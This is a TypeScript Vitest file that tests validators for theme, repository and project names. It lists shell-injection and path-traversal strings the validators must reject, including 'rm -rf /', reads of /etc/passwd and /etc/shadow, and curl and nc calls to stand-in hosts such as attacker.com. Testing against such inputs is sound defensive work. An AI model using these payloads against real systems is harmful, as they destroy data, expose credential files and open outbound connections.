// ─────────────────────────────────────────────────────
// input-validation.test.ts — Validation tests
// ─────────────────────────────────────────────────────

import { describe, it, expect } from 'vitest';
import {
  validateThemeName,
  validateRepoName,
  validateProjectName,
} from './input-validation';

describe('Input Validation Security', () => {
  describe('validateThemeName', () => {
    it('accepts valid lowercase theme names', () => {
      expect(() => validateThemeName('dark')).not.toThrow();
      expect(() => validateThemeName('light')).not.toThrow();
      expect(() => validateThemeName('material')).not.toThrow();
      expect(() => validateThemeName('theme_v2')).not.toThrow();
      expect(() => validateThemeName('theme-dark')).not.toThrow();
    });

    it('rejects command injection attempts', () => {
      expect(() => validateThemeName('; rm -rf /')).toThrow();
      expect(() => validateThemeName('theme && curl attacker.com')).toThrow();
      expect(() => validateThemeName('theme | cat /etc/passwd')).toThrow();
      expect(() => validateThemeName('theme$(whoami)')).toThrow();
      expect(() => validateThemeName('theme`whoami`')).toThrow();
      expect(() => validateThemeName('theme\n')).toThrow();
    });

    it('rejects uppercase letters', () => {
      expect(() => validateThemeName('Dark')).toThrow();
      expect(() => validateThemeName('THEME')).toThrow();
    });

    it('rejects spaces', () => {
      expect(() => validateThemeName('dark theme')).toThrow();
      expect(() => validateThemeName('theme ')).toThrow();
    });

    it('rejects empty strings', () => {
      expect(() => validateThemeName('')).toThrow();
    });

    it('rejects excessively long names', () => {
      const longName = 'a'.repeat(200);
      expect(() => validateThemeName(longName)).toThrow();
    });
  });

  describe('validateRepoName', () => {
    it('accepts valid repository names', () => {
      expect(() => validateRepoName('my-project')).not.toThrow();
      expect(() => validateRepoName('termui-demo')).not.toThrow();
      expect(() => validateRepoName('project_1')).not.toThrow();
      expect(() => validateRepoName('myrepo123')).not.toThrow();
    });

    it('rejects path traversal attempts', () => {
      expect(() => validateRepoName('../../../etc')).toThrow();
      expect(() => validateRepoName('repo/..')).toThrow();
      expect(() => validateRepoName('..')).toThrow();
    });

    it('rejects command injection attempts', () => {
      expect(() => validateRepoName('repo; rm -rf /')).toThrow();
      expect(() => validateRepoName('repo && curl evil.com')).toThrow();
      expect(() => validateRepoName('repo | cat /etc/passwd')).toThrow();
      expect(() => validateRepoName('repo$(whoami)')).toThrow();
      expect(() => validateRepoName('repo`whoami`')).toThrow();
    });

    it('rejects uppercase letters', () => {
      expect(() => validateRepoName('MyRepo')).toThrow();
      expect(() => validateRepoName('REPO')).toThrow();
    });

    it('rejects spaces', () => {
      expect(() => validateRepoName('my repo')).toThrow();
      expect(() => validateRepoName('hello world')).toThrow();
    });

    it('rejects empty strings', () => {
      expect(() => validateRepoName('')).toThrow();
    });

    it('rejects names starting with hyphen or underscore', () => {
      expect(() => validateRepoName('-repo')).toThrow();
      expect(() => validateRepoName('_repo')).toThrow();
    });
  });

  describe('validateProjectName', () => {
    it('accepts valid project names', () => {
      expect(() => validateProjectName('my-app')).not.toThrow();
      expect(() => validateProjectName('my-project')).not.toThrow();
      expect(() => validateProjectName('app123')).not.toThrow();
      expect(() => validateProjectName('project_v1')).not.toThrow();
    });

    it('rejects injection and path traversal', () => {
      expect(() => validateProjectName('../app')).toThrow();
      expect(() => validateProjectName('app; rm -rf /')).toThrow();
      expect(() => validateProjectName('app && curl evil.com')).toThrow();
    });
  });
});

describe('Security Attack Vectors', () => {
  it('prevents shell metacharacter injection in theme names', () => {
    const attackVectors = [
      '; rm -rf /',
      '$(rm -rf /)',
      '`rm -rf /`',
      '| cat /etc/passwd',
      '& whoami',
      '> /tmp/pwned',
      '< /etc/passwd',
    ];

    for (const vector of attackVectors) {
      expect(() => validateThemeName(vector)).toThrow();
    }
  });

  it('prevents common injection patterns', () => {
    const injectionPatterns = [
      '"; rm -rf /',
      '\' && curl attacker.com',
      '`whoami`',
      '$(whoami)',
      '; cat /etc/shadow',
      '|| nc attacker.com 4444',
    ];

    for (const pattern of injectionPatterns) {
      expect(() => validateRepoName(pattern)).toThrow();
    }
  });
});
